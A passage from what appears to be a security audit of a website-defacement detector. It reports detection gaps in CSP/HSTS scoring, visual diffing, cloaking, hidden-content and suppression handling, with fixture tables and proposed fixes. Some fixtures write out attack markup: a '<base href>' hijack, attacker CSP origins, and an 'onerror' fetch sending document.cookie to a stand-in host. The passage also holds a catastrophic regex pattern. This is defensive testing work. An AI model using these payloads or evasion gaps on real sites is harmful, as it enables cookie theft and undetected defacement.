- **Subsystem / file(s)**: `worker/detection/metadata.py:121-142` (`_classify_value_change`, CSP branch; the `frozenset` superset/subset test at `:131-137`), `:215-262` (`_header_diff`, `score = min(0.8, 0.3·removed + 0.1·weakened)` at `:255`), `worker/detection/metadata.py:233-236` (the `SECURITY_HEADERS` loop, which reads only the probed header map); the taxonomy's missing meta-refresh/meta-CSP ref audit is `worker/detection/dom.py:640-676` (`_collect_refs` collects script/a/link/iframe/form only).
- **Reproduction** (3 passes each, real Chromium screenshots on **both** sides, `content_hash` identical by construction, 3/3 identical, pstdev 0):
  | fixture | layer 6 | fused risk | verdict |
  |---|---|---|---|
  | `BA7_csp_widen_star` `default-src 'self'` → `*` | **0.0000** | **0.0019** | **`clean`** |
  | `BA7b_csp_unsafe_inline` `script-src 'self'` → `'unsafe-inline'` | **0.0000** | **0.0019** | **`clean`** |
  | `BA7c_csp_attacker_origin` `+ https://cdn.evil-exfil.tld` (exfil origin) | **0.0000** | **0.0019** | **`clean`** |
  | `E12_meta_csp_weaken` page ships `<meta http-equiv=Content-Security-Policy content="default-src *; script-src * 'unsafe-inline'">` | 0.0000 (meta not read) | 0.1392 | `changed` |
  Every other layer is exactly 0.0 by the identical-hash gate, so layer 6 is the *only* possible channel and it emits nothing.
- **Root cause**: (a) `metadata.py:131-137` decides CSP direction by `frozenset` superset/subset. Every real relaxation *exchanges* one token for another (`{'self'}` vs `{'*'}` is neither a subset nor a superset), so all of them return `unknown = True` → `None` → filed under `security_headers_changed`, never scored. (b) The FP direction is worse than the FN: adding an attacker origin makes the token set a strict superset, so the classifier calls it **`stronger`** and scores 0.0. (c) `E12` is a separate defect: `_header_diff` reads only `PageData.headers`, so a page that carries its policy in a `<meta http-equiv>` tag has **no** CSP channel at all, and layer 3's ref audit does not collect `<meta>`.
- **Proposed remedy category**: CSP source-expression *restrictiveness ordering* (a token-semantics table, not a set test) replacing `metadata.py:131-137`; symmetric handling of the additive direction; read `<meta http-equiv="Content-Security-Policy">` as a second, lower-precedence CSP source and diff the *effective* (header ⊕ meta) policy; extend `_collect_refs` to meta-refresh targets. All four are detection-semantics changes; implementation belongs to the remediation prompt.
- **Source**: Phase 8 fixture programme (taxonomy #9 + Session A backlog rows 7 and 9), and the §3.2/§3.5 "redirect-based cloaking" requirement.

### AUDIT-8-2 — A maximal HSTS neutralisation (2 y + `includeSubDomains` + `preload` → `max-age=300`) scores 0.1 and fuses to 0.0025
- **Severity**: **High** — a documented security regression that is a near-total `clean`; not Critical only because the *content* is unchanged and no attack payload lands in this fixture (the CSP half of the same class is the Critical one, AUDIT-8-1).
- **Subsystem / file(s)**: `worker/detection/metadata.py:116-120` (`_hsts_strength` → direction), `:255` (`score = min(0.8, 0.3*removed + 0.1*weakened)`).
- **Reproduction**: `BA8_hsts_max_downgrade`, 3 passes, identical screenshots both sides, layer 6 = **0.1000**, fused **0.0025**, verdict `changed`, no escalation. Removing only `includeSubDomains`+`preload` also reads `weaker` at 0.1. Five *removed* security headers correctly read 0.8 (positive control, re-verified).
- **Root cause**: every weakening direction is worth exactly 0.1 regardless of magnitude. The layer's own module docstring claims "semantic regressions … score as downgrades"; the magnitude of the regression is not modelled at all, so `preload`-eligible 2-year HSTS and a 5-minute HSTS are indistinguishable to the score. Session A's same finding holds; this measurement adds the fused number (0.0025) and confirms it is a *silence*, not merely a weak signal.
- **Proposed remedy category**: magnitude-aware header scoring (graded rather than binary per-header weights), plus a per-directive *precedence* notion (a `preload`-token removal is not the same fact as a `max-age` reduction).
- **Source**: Phase 8, Session A backlog row 8.

### AUDIT-8-3 — Layer 4 has no area floor: a small defaced asset with an unchanged DOM is invisible, and a 3-pixel banner strip is below the material bar
- **Severity**: **Critical** for the attack direction — §6.4's false-`clean`-adjacent bullet plus a genuine attack pattern missed. The "changed" verdict is retained (layer 4 = 0.0307 > `NOISE_FLOOR`), so this is *not* a false `clean`; on the rubric it is a false negative on an actual attack pattern, and I grade it **Critical** because taxonomy techniques #2 and #8 (asset swap / image-only tamper with unchanged DOM) are **claimed Represented** in the Phase-2 matrix and the coverage is only true for large assets.
- **Subsystem / file(s)**: `worker/detection/visual.py:110-201` (`layer4_visual_diff`) — the score is `min(1, 0.7*ssim_score + 0.3*hash_score + 0.30*chroma_score)` at `:184`, with one *global* SSIM over the shared top region (`:140-160`), two *whole-image* perceptual hashes (`:162-169`) and one *global* chroma mean/std (`:155-156`). No tile/localisation term, no area floor, no per-region aggregation.
- **Reproduction** (3 passes each, pstdev 0; the current side is the *same page re-rendered with different bytes behind the same URL*, which is how a real origin/CDN asset swap presents):
  | fixture | identical DOM | asset area | L4 | fused | verdict |
  |---|---|---|---|---|---|
  | `T2_asset_swap_dom_identical` | yes (byte-identical) | 320×120 | **0.0307** | **0.0043** | `changed` |
  | `T8_image_only_tamper` | yes | 640×300 | **0.0975** | **0.0244** | `changed` |
  | `T2b_asset_swap_fullbleed` | yes | full viewport | **0.4090** | **0.9889** | **`flagged`** |
  | `VB4_logo_swap` (benign twin of T2) | yes | 320×120 | **0.0307** | 0.0043 | `changed` |
  Plus the 9-point area sweep in §2.4: **0.1 % of page height → L4 0.1514 → risk 0.0936, silent; 0.5 % → L4 0.2817 → risk 0.7593, flagged.**
  Note the benign twin and the attack read **exactly the same** 0.0307 — layer 4 is not merely insensitive at this scale, it is *blind*; only the (here benign) asset contents differ.
- **Root cause**: a global-average perceptual comparison dilutes a localised change by the unchanged fraction. The corpus's `visual_banner_deface` pure-swap rows are all *banner-sized*, so the standing guard only exercises the large end of the range. Also relevant: `MAX_COMPARE_HEIGHT = 4096` (`:47`) means a defacement injected below 4096 px of a taller page is compared against nothing, and `_common_size` (`:75-82`) crops SSIM to the shorter scaled height — a growth *below* the fold can be entirely invisible.
- **Proposed remedy category**: tile/region-localised layer 4 (grid-cell SSIM or pHash with a max/percentile aggregation instead of a whole-page mean) plus an explicit changed-area floor, and a per-region variant of the perceptual-hash pair; a corpus axis `visual_asset_swap_small` at several asset sizes to pin the range. Implementation in remediation.
- **Source**: Phase 8 §2.4 area sweep + the taxonomy #2/#8 fixtures; this is the Phase-2 "Represented" claim for techniques #2 and #8 **partially invalidated**.

### AUDIT-8-4 — Layer 7 is 0.10–0.13 for a 20-token conclusive cloaked defacement on pages of 60, 400 and 1400 reference tokens, and the corpus contains no partially-cloaked row
- **Severity**: **Critical** — §6.4's false-`clean` bullet is adjacent, but this reads `changed` at 0.0075-0.0105 with layer 7 the *only* possible channel, so it is graded **Critical** on the "a false 'clean'/silent-success on an actual attack pattern" band: a crawler-only defacement of a real page is completely invisible. Re-confirms and quantifies AUDIT-SA2-3.
- **Subsystem / file(s)**: `worker/detection/cloaking.py:86-118` (`_variant_cloak_score`), `:100` (`new_token_fraction = min(1.0, added / max(1, len(ref_tokens)))`), `:62-63` (`_ADD_RAMP_LO = 0.15`, `_REMOVE_RAMP_LO = 0.45`, `_RAMP_HI = 0.85`), `:59` (`_MIN_FOREIGN_TOKENS = 12`); the calibration artifact `worker/detection/training/{fusion_dataset,regression_corpus}.json` (no partial-cloaking axis in either).
- **Reproduction** (3 passes each, pstdev 0; the current page HTML is **byte-identical** to the baseline, so layer 7 is the only channel that can see the 20-token conclusive `WE HAVE BEEN HACKED BY THE DRAGON TEAM … telegram …` payload served to `googlebot`):
  | fixture | reference tokens | **L7** | fused | verdict |
  |---|---|---|---|---|
  | `BA10_partial_cloak_small` | ~60 | **0.1296** | 0.0105 | `changed` |
  | `BA10_partial_cloak_medium` | ~400 | **0.1032** | 0.0075 | `changed` |
  | `BA10_partial_cloak_large` | ~1400 | **0.1032** | 0.0075 | `changed` |
  Layer 7's own escalation trigger is **0.4440**; a conclusive signature scores 1.0. The score *decreases* as the page grows. The legitimate mobile-serves-less case, by contrast, grades 0.62-0.66 on the removal ramp. (Separately, and read from the code rather than measured here: a payload of ≤ `_MIN_FOREIGN_TOKENS = 12` unique tokens — a minimal `"hacked by" + "your site" + t.me handle` — is inside the grace and scores 0.0 at *any* page size.)
- **Root cause**: the additive ramp is anchored to a **relative** quantity (`added/|ref|`), so a fixed-size injection's signal decays as the page grows — the exact opposite of the dilution-immunity the module docstring claims for the additive channel. Combined with `_ADD_RAMP_LO = 0.15`, any payload below 15 % of the reference token set is unconditionally 0.0, and real pages carry 400-3000+ unique tokens, so a bottom-of-page banner is 1-6 % of them.
- **Proposed remedy category**: add an **absolute-mass** channel (a fixed token-count trigger independent of reference size), a grace that scales with page size rather than a flat 12, and re-derive `_ADD_RAMP_LO` from a benign population that includes the omitted axes. The corpus axis `partial_cloaking_small_payload` across ≥ 3 reference sizes (Session A's O-SA-13) must land **first** — there is currently no row in either artifact that exercises the 0.0-0.9 range of the additive ramp, so any re-tune would be unvalidated.
- **Source**: Phase 8 §3.5 (Session A's explicit routing) + the 19-row backlog item 10.

### AUDIT-8-5 — Revealing hidden content is invisible: layer 2's sensitive channel is additive-only, and layer 5/8 see no new text
- **Severity**: **Critical** — a false negative on an actual attack pattern; a cloaked SEO farm becoming *visible* (and a conclusive defacement becoming visible) produces **no** layer score at all.
- **Subsystem / file(s)**: `worker/detection/dom.py:562-568` (`new_hidden = max(0, c["hidden_count"] - b["hidden_count"])`, `sensitive = new_scripts + new_iframes + new_hidden`, `sensitive_score = 1 - exp(-0.7*sensitive)`), `:572` (`score = max(churn_score*churn_weight, sensitive_score)`); `worker/detection/signatures.py:197-211` (`_new_text` — the text was in the baseline, so it is not new).
- **Reproduction** (3 passes each, pstdev 0):
  | fixture | construction | L1 | **L2** | L3 | L5 | L8 | fused | verdict |
  |---|---|---|---|---|---|---|---|---|
  | `BA11c_unhide_internal_farm` | hidden farm with **same-origin** hrefs becomes visible | 1.0 | **0.0000** | 0.0 | 0.0 | 0.0 | 0.1372 | `changed` |
  | `E13_hidden_text_revealed` | `display:none` spam keywords revealed | 1.0 | **0.0000** | 0.0 | 0.0 | 0.0 | 0.1372 | `changed` |
  | `E14_hidden_defacement_revealed` | `display:none` **conclusive defacement** revealed | 1.0 | **0.0000** | 0.0 | 0.0 | 0.0 | 0.1372 | `changed` |
  | `BA11b_unhide_spam_farm_real` **control** (same farm, but with 8 *new* external domains) | 1.0 | **0.0000** | **0.0** | 0.0 | 0.0 | 0.5422 | `flagged` |
  The control is the decisive measurement: layer 2 stays at **exactly 0.0** in the un-hiding direction *even when the page is otherwise unchanged*, and the only reason the spam-farm variant flags is that layer 3 independently saw eight brand-new hostnames — **not** that the content was revealed.
- **Root cause**: the sensitive term is `max(0, current − baseline)` per channel, so a **decrease** in hidden count is arithmetically invisible; and because no element is added or removed, `structural_churn = 0` so there is no fallback. This is the generalisation of AUDIT-4-6's sub-case: every "sensitive" channel in the stack is additive.
- **Proposed remedy category**: symmetric sensitive channels — score a hidden→visible transition explicitly (a conservative fraction of the additive weight), and give layer 2 a "visibility increased" term independent of the count delta. A `hidden_count` *drop* on an otherwise-unchanged tree is a cheap, high-precision signal that costs nothing on benign pages (legitimate un-hiding is rare and reviewable).
- **Source**: Phase 8, the isolated construction of Session A backlog row 11 (whose original fixture was confounded by new domains).

### AUDIT-8-6 — The `_new_text` granularity collapse false-flags a *punctuated* page too, so the "punctuated pages are safe" mitigation does not hold
- **Severity**: **High** — a false positive on legitimate, extremely common site behaviour (any one-word editorial edit to a page that carries baseline-present lexicon vocabulary produces an `Alert` + a `RemediationExecution`). The Critical half (a real attack on such a page) is already logged as AUDIT-4-1; this is the FP half plus a refutation of the natural mitigation.
- **Subsystem / file(s)**: `worker/detection/signatures.py:197-211` (`_new_text`), `worker/detection/semantics.py:120-123` (`_new_visible_text`), `:277-283` (`aggression_score = 1 - exp(-1.2*Σw)`, `topic_score = min(0.7, 0.35*|topics|)`, `score = max(...)`).
- **Reproduction** (3 passes each, pstdev 0). Both pages carry the **identical** baseline-present lexicon (three profanity terms in a nav, plus an aggression paragraph containing `compromised / regime / traitors / outage`); the only change is `collapsed` → `imploded`:
  | fixture | page | L4 | **L5** | **L8** | fused | verdict |
  |---|---|---|---|---|---|---|
  | `BA13_unpunctuated_lexicon` | no `[.!?]` anywhere | 0.0068 | **0.6000** | **0.4512** | **0.9999** | `flagged` |
  | `BA13b_punctuated_control` | **every clause punctuated** | 0.0978 | **0.0000** | **0.2134** | **0.8370** | **`flagged`** |
  The punctuated control does not clear the bar either: layer 8's `topic_score` (capped at 0.7) still reaches 0.2134 from lexicon vocabulary that was **always in the baseline**, and that alone fuses to 0.8370 with `layer1_hash = 1.0` and a 0.0978 visual delta.
- **Root cause**: the collapse is total on unpunctuated pages (L5 0.6 from baseline-present profanity), but on punctuated pages the *topic* channel has the same baseline-blindness through a different door: `_new_text` returns whole *sentences*, and the sentence containing `compromised`/`regime`/`traitors` is a "new" piece merely because a neighbouring word changed. The `min(0.7, …)` cap on `topic_score` and the *absence* of any cap on `aggression_weight` are the asymmetry Session A flagged; the measurement adds that even the capped channel is enough to cross 0.50 on a punctuated page.
- **Proposed remedy category**: make the lexicon channels genuinely new-text-only by subtracting on **shingle/token multisets** rather than sentence pieces (Session A's own opportunity), and re-derive both caps from a benign population that includes punctuated pages with baseline-present vocabulary. A standing end-to-end guard: punctuated page + baseline-present lexicon + one benign word edit ⇒ `clean`.
- **Source**: Phase 8, Session A backlog row 13 — **with a corrected control**, which the prior phase did not have.

### AUDIT-8-7 — Removal-only defacement is invisible: layer 3 scores all five reference kinds at exactly 0.0 on removal, and layer 2's churn is content-weighted down
- **Severity**: **High** — a false negative on an actual, documented defacement category ("vandalism by deletion"), and the benign twin (an operator removing their own Turnstile widget) is equally invisible, so the system is at least internally consistent. Graded High rather than Critical because no new hostile content lands and the verdict is at least `changed`.
- **Subsystem / file(s)**: `worker/detection/dom.py:704-710` (`weights` and `churn_score` computed over **added** refs only; `removed` is evidence-only at `:714-724`), `:727-730` (`domain_score`, `churn_score = min(0.4, 0.02*total_new_refs)` — both a function of *added* refs), `:58-141` (`_CONTENT_CHURN_TAGS` + `_CONTENT_CHURN_WEIGHT = 0.2`).
- **Reproduction** (3 passes each, pstdev 0):
  | fixture | removal | L2 | **L3** | fused | verdict |
  |---|---|---|---|---|---|
  | `BA12_removal_only_deface` | the site's own `<form action='/login'>` **and** its analytics `<script src>` | 0.0522 | **0.0000** | 0.1453 | `changed` |
  | `BA12b_removal_only_iframe` | the site's own ad `<iframe src>` | 0.0129 | **0.0000** | 0.1392 | `changed` |
  Layer 3's evidence does record `removed_count: 1` — the signal is captured and never scored, exactly as AUDIT-4-6 logged. My measurement adds the *end-to-end* fused numbers with real screenshots on both sides (Session A measured with layer 4 degraded).
- **Root cause**: the layer's score model was built for the injection signal class (new external domains) and never weighted the removal direction; `churn_score`'s `0.02 * total_new_refs` is likewise additive-only. The one layer that *does* score a removal direction is layer 6 (robots.txt and header removals, `metadata.py:255/272`) — and that asymmetry is itself evidence the direction was recognised for one layer and not the others.
- **Proposed remedy category**: weight sensitive-kind removals at a conservative fraction of the additive weights, and add a `removed_refs`-based churn term with its own small coefficient; a positive control must prove that an operator's legitimate widget removal stays under the material bar.
- **Source**: Phase 8, Session A backlog row 12.

### AUDIT-8-8 — `<base href>` and same-origin event-handler payloads are invisible to layer 3, which resolves references against `PageData.final_url` rather than the document's own base
- **Severity**: **High** — a false negative on a real takeover primitive, and the E2 case demonstrates the practical worst outcome in the suite: it lands **inside the escalation band** (0.4975) without alerting, i.e. a permanent cadence pin plus an LLM call on every scan, with no second opinion available to resolve it.
- **Subsystem / file(s)**: `worker/detection/dom.py:596-613` (`_norm_ref` — `urljoin(base_url or "", ...)` with `base_url = page.final_url` at `:651`), `:640-676` (`_collect_refs` — only `src`/`href`/`action`, no attribute-level event handlers, no `<base>`).
- **Reproduction** (3 passes each, pstdev 0):
  | fixture | construction | L2 | **L3** | L4 | fused | verdict | LLM |
  |---|---|---|---|---|---|---|---|
  | `E1_base_href_hijack` | `<base href='https://evil-cloak.tld/'>` re-points **every** relative URL in the browser | 0.0129 | **0.0000** | 0.0 | 0.1392 | `changed` | no |
  | `E2_event_handler_injection` | `<img src='/px.gif' onerror="fetch('https://evil-cloak.tld/c?'+document.cookie)">` — payload in an **attribute**, `src` is same-origin | 0.0043 | **0.0000** | 0.0694 | **0.4975** | `changed` | **YES (0.40-0.75)** |
- **Root cause**: (a) `_norm_ref` normalises against `PageData.final_url` (the URL the capture *landed on*), while the browser resolves against the document's `<base href>`. A `<base>` injection therefore changes every reference the visitor actually loads with **zero** delta in layer 3's view. (b) `_collect_refs` audits five attributes; it never looks at `on*` handlers, so a payload whose network target lives in an attribute is structurally outside its vocabulary. (c) AUDIT-3-1's stale-`final_url` defect feeds the same field, so the two compound.
- **Proposed remedy category**: resolve references against the document's `<base href>` when present (and surface a `<base>`-change as evidence in its own right); add an event-handler / `javascript:`-URL audit channel with its own conservative weight; treat an `<base>` element appearing where the baseline had none as a first-class layer-3 signal.
- **Source**: Phase 8 §3.6 (novel adversarial shapes, Rule 17).

### AUDIT-8-9 — A defacement inside `<noscript>` is invisible to Wardress's own screenshot, and a `title=` tooltip payload is invisible to every channel
- **Severity**: **Medium** — a partial implementation that degrades gracefully (verdict stays `changed`; the payload only reaches JS-disabled visitors) but misses the intent of a rendering-based detector. Not High: the impact is conditional on the visitor's JS setting, and Wardress's own capture is a JS-enabled render by design.
- **Subsystem / file(s)**: `worker/stealth.py` / `worker/fetcher.py` (the capture always enables JS, so `<noscript>` is never rasterised); `worker/detection/signatures.py:110-126` (`extract_visible_text` explicitly skips `noscript`, `template`, `script`, `style` — correctly for the text channel, but it means the *only* channel that could see a noscript render is layer 4, and layer 4 never gets one).
- **Reproduction** (3 passes each, pstdev 0):
  | fixture | L2 | L3 | **L4** | L5 | L8 | fused | verdict |
  |---|---|---|---|---|---|---|---|
  | `E5_noscript_payload` full-viewport `YOUR SITE HAS BEEN HACKED` inside `<noscript>` | 0.0255 | 0.0 | **0.0000** | 0.0 | 0.0 | 0.1411 | `changed` |
  | `E9_title_attr_deface` `title='HACKED BY DRAGON TEAM …'` on the `<h1>` | 0.0000 | 0.0 | **0.0000** | 0.0 | 0.0 | 0.1372 | `changed` |
  Layer 4 = **exactly 0.0** on E5: ssim 1.0000, pHash 0 bits, dHash 0 bits, chroma Δ 0.00 — the pixel arrays are identical, because Chromium does not render `<noscript>` with JS enabled.
- **Root cause**: `<noscript>` and `title` are excluded from the text channel (correctly), and the visual channel is a single JS-enabled render, so the two exclusions compose into a total blind spot. There is no "what would a JS-disabled visitor see" render, and no attribute-text channel.
- **Proposed remedy category**: a cheap secondary JS-disabled render (or a `noscript`-substituted text extraction) as a *secondary* layer-4 input with a small weight, and a `title`/`alt`/`aria-label` attribute-text scan in layer 5 with a conservative weight — all three are outside-HTML-text surfaces the current design does not model.
- **Source**: Phase 8 §3.6 (novel adversarial shapes, Rule 17).

### AUDIT-8-10 — The suppression CSS-selector/regex primitive is materially weaker than logged, but the `bbox` primitive is total
- **Severity**: **High** — a suppression rule set can permanently blind all nine layers for a conclusive defacement, with no coverage signal. Graded High (not Critical) because it requires an operator-authored rule, i.e. it is reachable by a single plausible action rather than by the attacker alone; but the primitive is exactly the one an adversary who can guess a common selector would use.
- **Subsystem / file(s)**: `worker/detection/pipeline.py:144-150` (suppression runs **before** every content layer and *replaces* the content on both sides), `:169` (bbox rules go to `layer4_visual_diff`), `worker/detection/suppress.py:87-118` (`build_suppression` — accepts `*`, `body`, `main`, `.*`, `[\s\S]+` with no warning and no size check), `:143-163` (per-`sub()` 2.0 s budget, per-side partial application).
- **Reproduction** — conclusive defacement (`HACKED BY THE DRAGON TEAM` + `Your security is weak` + `t.me/dragonx`), real screenshots on both sides, 3 passes each, pstdev 0:
  | fixture | rules | L2 | L3 | **L4** | L5 | L8 | fused | verdict |
  |---|---|---|---|---|---|---|---|---|
  | *(no suppression)* | — | 0.0126 | 0.0 | 0.1031 | **1.0** | 0.35 | **1.0000** | `flagged` |
  | `S3a` | `css_selector #banner` (the attacker's wrapper) | 0.0 | 0.0 | 0.1031 | **0.0** | 0.0 | **0.7044** | `flagged` |
  | `S3b` | `css_selector [role=alert]` | 0.0 | 0.0 | 0.1031 | **0.0** | 0.0 | **0.7044** | `flagged` |
  | `S3d` | `css_selector main` (over-broad) | 0.0 | 0.0 | 0.1031 | **0.0** | 0.0 | **0.7044** | `flagged` |
  | `S3e` | `regex [\s\S]+` (over-broad) | 0.0126 | 0.0 | 0.1031 | **0.0** | 0.0 | **0.7078** | `flagged` |
  | `S3c` | `css_selector aside` (**matches nothing** on this page) | 0.0167 | 0.0 | 0.1031 | **1.0** | 0.35 | **1.0000** | `flagged` |
  | `S3g` | `bbox 0.0,0.0,1.0,0.30` | 0.0126 | 0.0 | **0.0000** | **1.0** | 0.35 | **1.0000** | `flagged` |
  | `S3h` | `css_selector #banner` **+** `bbox 0.0,0.0,1.0,0.30` | 0.0 | 0.0 | **0.0000** | **0.0** | 0.0 | **0.1372** | **`changed`** |
  **Two corrections and one escalation.** (i) **Correction:** the `css_selector`/`regex` arms still **flag at 0.7044-0.7078** in production, because layer 4 is *not* suppressed by content rules and the banner is a large visual delta. Session A's measurement of 0.195 (which drove the High half of AUDIT-4-4) was taken with **layer 4 degraded**. With real screenshots the primitive reduces a 1.0 alert to a 0.70 alert — serious (it arms the cadence pin and is indistinguishable in the UI from a real alert) but **not** a suppression-induced `clean`. (ii) **Correction:** a rule that matches nothing (`aside`) is a silent no-op, so the "operator over-broad rule" accident needs a selector that *does* match. (iii) **Escalation:** the **`bbox` rule is the real primitive.** A `bbox` paints the region out of *both* screenshots (`visual.py:85-107`), so it is the only rule type that blinds the surviving channel; combining it with a matching `css_selector` drops a conclusive defacement to **0.1372 / `changed`** — the only escape from a conclusive attack in the entire 85-fixture suite. And `suppression_applied` evidence records only *which* rules ran, never how much content they removed.
- **Root cause**: suppression is a whole-content replacement applied to both sides, so it removes the *evidence*, not the *threat*; the design assumes the operator is suppressing known-benign regions, and nothing distinguishes an over-broad rule from a targeted one. `bbox` is strictly more powerful because it is the only rule that also edits the visual channel.
- **Proposed remedy category**: record suppression **coverage** (chars/bytes removed per side, fraction of the document) in the evidence and surface it in the UI, so a 100 %-of-page rule is visible; warn or require confirmation for rules whose coverage exceeds a threshold; add a standing invariant that **a `bbox` rule may not be the only channel protecting a region** (e.g. keep a content-layer delta on the suppressed text for the fusion, in un-suppressed form, as a low-weight "suppressed region changed" term rather than discarding it).
- **Source**: Phase 8 §3.5 (Session A's explicit routing of the suppression-adversary primitive) + the 19-row backlog.

### AUDIT-8-11 — A suppression rule that times out manufactures the delta it was meant to silence (AUDIT-4-4's mechanism, isolated and confirmed with a clean control)
- **Severity**: **Medium** (unchanged from Phase 4) — the mechanism is real and now cleanly isolated, but the trigger requires an operator-authored alternation bomb, and the manufactured delta lands in a benign direction (see below). Not High: the produced signal is a *false positive*, not a suppressed true positive, on this fixture.
- **Subsystem / file(s)**: `worker/detection/suppress.py:143-163` — the `try/except TimeoutError` wraps the **whole element loop**, so the first timeout aborts every remaining node; the 2.0 s budget is per `compiled.sub()` call, and the abort point is document-order dependent. `supp.unusable` accumulates **one duplicate entry per side** (`:161-163`).
- **Reproduction** (3 passes per arm, pstdev 0; node = `<p>` + 5000 `a` + `c</p>`, rule = `(a|aa)+b|Session id: \d+`):
  | arm | baseline apply | scan apply | baseline kept `Session id` | scan kept | outputs equal | fused | verdict |
  |---|---|---|---|---|---|---|---|
  | **armed**, bomb first on baseline | **1999.5 ms** (timeout fires, rule skipped mid-loop) | 1.5 ms | **True** | **False** | **False** | **0.8290** | `flagged` |
  | armed, reversed | 2.0 ms | **2000.3 ms** | False | **True** | **False** | 0.8290 | `flagged` |
  | **symmetric control** (identical HTML both sides) | 1.0 ms | 1.6 ms | False | False | **True** | **0.0019** | **`clean`** |
  The control is what makes this conclusive: the *only* difference between `clean` and `flagged` is where the pathological node sits in document order. The suppression rule itself creates the asymmetry — one side keeps a token the other lost.
- **Root cause**: per-side, partial, first-timeout-aborts-everything application. The evidence records the timeout but not the divergence it caused, and the duplicate `unusable` entry per side actively misreports how many rules failed.
- **Proposed remedy category**: all-or-nothing per rule — pre-flight the rule over **both** sides' text nodes; if *either* side times out, apply it on **neither** and record `unusable` **once**; plus a per-rule total time budget rather than per-`sub()`. (Design confirmed correct by this phase's measurement; no disagreement with Phase 4's proposal.)
- **Source**: Phase 8 §3.5 (Session A routed "re-test alternation-based catastrophic patterns against the suppression path specifically").

### AUDIT-8-12 — A legitimate responsive breakpoint change flags at 1.0 with byte-identical HTML
- **Severity**: **High** — §6.4's explicit clause: a false positive that alerts operators on legitimate, common site behaviour. Responsive restyling is one of the most routine events a monitored site can undergo (a new breakpoint, a container-width change, a device-class reclassification), and this shape has *no* content change at all.
- **Subsystem / file(s)**: `worker/detection/visual.py:110-201`; contributing: `worker/detection/fusion.py:62-71` (layer 4's coefficient **26.258** is 6× layer 2's 1.286), `:182-186` (no floor applies), and the **absence** of any viewport or render-condition fact on `PageData` (`worker/detection/types.py:12-43` — the AUDIT-4-7 handoff is unimplemented, so detection cannot tell a breakpoint change from an attack).
- **Reproduction**: `VB3_breakpoint_restyle`, 3 passes, pstdev 0. Baseline rendered at 1366 px, scan at 820 px, **the same HTML file and therefore the same `content_sha256`**, so `layer1_hash = 0.0` and layers 2/3/5/8 are `skipped` by the identical-hash gate — layer 4 is the only channel by construction. **L4 = 0.6293, ssim 0.5220, pHash 106/256, dHash 132/256, chroma-mean Δ 7.83, page height 3103 → 3355 px. Fused risk 1.0000, verdict `flagged`, alert + `RemediationExecution` created.**
- **Root cause**: the entire system's sensitivity is set by one channel with a 26.26 coefficient, and that channel has **no notion of why** two renders differ. A viewport or media-query change is pixel-wise indistinguishable in kind from a hostile recolour, and nothing in the pipeline records the viewport, device class, or user agent that produced either screenshot. The two honest controls in the suite confirm the coefficient is not itself the bug: identical-HTML render noise reads 0.0000 (`P1`), and a JS-heavy interactive page with a rotating ad slot, consent widget, carousel, sticky header and live ticker reads **0.0021-0.0029 across 4 render pairs** (`S1`) — so the risk is specifically *layout* change, not nondeterminism.
- **Proposed remedy category**: carry the capture's viewport/device-class/`prefers-color-scheme` onto `PageData` (the AUDIT-4-7 handoff, narrowed) and treat a viewport change as a **first-class explanation** that discounts the layer-4 score; add a responsive-restyle corpus axis with 3 viewport pairs as a standing pin.
- **Source**: Phase 8 §2.3 + the brief's mandatory benign visual twin, and Session A's routed "layer 4 against interactive pages" (which this measurement answers in the *positive* direction — see §6).

### AUDIT-8-13 — Legitimate large content and layout changes flag: 40 added articles, an A/B hero swap, a grid redesign and a one-paragraph edit all alert
- **Severity**: **High** — a false positive on legitimate, common site behaviour, on four independent benign axes, with alerts **and** `RemediationExecution` rows created.
- **Subsystem / file(s)**: `worker/detection/visual.py:184` (the global-composite score), `worker/detection/fusion.py:62-71` (the fitted coefficients), `worker/detection/training/fusion_model.json` (fitted on a dataset whose benign population omits these axes).
- **Reproduction** (3 passes each, pstdev 0):
  | fixture | benign axis | L2 | L3 | **L4** | L8 | fused | verdict |
  |---|---|---|---|---|---|---|---|
  | `E10_churn_padding_only` | **40 added articles** (no attack) | 0.2000 | 0.4000 | **0.1928** | 0.4275 | **0.9981** | `flagged` |
  | `B6_ab_variant_swap` | A/B hero copy swap | 0.0043 | 0.0 | **0.2979** | 0.0 | **0.9975** | `flagged` |
  | `B3_site_redesign` | grid layout + new theme sheet | 0.0255 | 0.0200 | **0.5223** | 0.0 | **1.0000** | `flagged` |
  | `B3b_site_redesign_bigger` | the above + a vendor script | 0.5034 | 0.0400 | **0.5223** | 0.0 | **1.0000** | `flagged` |
  | `B5_sanity_benign_quiet` | one quiet paragraph | 0.0043 | 0.0 | **0.0754** | 0.0 | **0.5368** | `flagged` |
  The `E10` / `E7` pair is the decisive one: the **same 40 articles** with the defacement added still flags at 1.0, so padding does not dilute the attack — and without the attack the padding **alone** flags at 0.9981. A single benign paragraph (`B5`) flags at 0.5368, which is 0.037 above the threshold: that is `layer1_hash = 1.0` plus a 0.0754 visual delta of a changed date string, and it is exactly the shape Session A's `sanity_benign_quiet` calibration row encodes.
- **Root cause**: two compounding calibration failures. (i) The fitted model's layer-4 coefficient (26.258) and layer-2 coefficient (1.286) make any *legitimate* layout change expensive; (ii) the training population's benign axes are 7 of 14, and the 7 omitted are precisely the ones that cross the bar — which my independent re-fusion confirms numerically (§5, item C). There is no out-of-family guard.
- **Proposed remedy category**: re-derive the coefficients and `MATERIAL_CHANGE_RISK` from a benign population that includes redesign, A/B, high-article-count and layout-shift axes; add the omitted axes to `regression_corpus.json` and enforce a standing `min-rows-per-benign-axis` (Session A's O-SA-12) so a build fails rather than shipping a 100 %-false-positive axis.
- **Source**: Phase 8 §1.4 + Session A backlog rows 2, 3, 5, 6 and AUDIT-2-4.

### AUDIT-8-14 — Layer 4 cannot distinguish an `@font-face` glyph hijack from a legitimate webfont swap, and the benign twin is the louder of the pair
- **Severity**: **High** — §6.4's explicit clause. Shipping or changing a webfont is one of the most common deliberate acts a site operator performs; here it produces an alert and a `RemediationExecution`, while the attack it is paired against is caught only marginally harder.
- **Subsystem / file(s)**: `worker/detection/visual.py:110-201` (no font/typography awareness; the score is pixels only), `worker/detection/types.py:12-43` (no declared font stack on `PageData`), `worker/detection/training/fusion_model.json`.
- **Reproduction** (3 passes each, pstdev 0; identical DOM, identical text, identical mechanism — only the font file differs):
  | arm | ssim | pHash/256 | dHash/256 | chroma-mean Δ | **L4** | fused | verdict |
  |---|---|---|---|---|---|---|---|
  | `V2_fontface_hijack` **attack** (12 glyph-outline pairs swapped) | 0.6741 | 24 | 41 | 0.11 | **0.3043** | **0.9979** | `flagged` |
